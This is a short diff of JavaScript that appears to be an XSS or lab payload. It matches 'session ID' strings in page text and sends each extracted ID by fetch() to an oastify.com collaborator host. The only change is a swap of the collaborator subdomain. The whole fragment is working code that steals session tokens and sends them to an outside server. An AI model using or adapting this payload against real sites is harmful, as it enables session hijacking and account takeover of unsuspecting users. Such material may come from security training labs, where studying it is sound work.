@@ -18,7 +18,7 @@ let s=t.match(/logged in;\s*session ID:\s*([^;]+);/g);
 if(s){
 s.forEach(match=>{
 let id=match.match(/session ID:\s*([^;]+);/)[1].trim();
-fetch('https://gvfm4t1z2002i3rdfqvhd7zotfz6nwbl.oastify.com?'+encodeURIComponent(id),{mode:'no-cors'});
+fetch('https://4bgakhhniogqyr71veb5tvfc93fu3lra.oastify.com?'+encodeURIComponent(id),{mode:'no-cors'});
 });
 }
 });
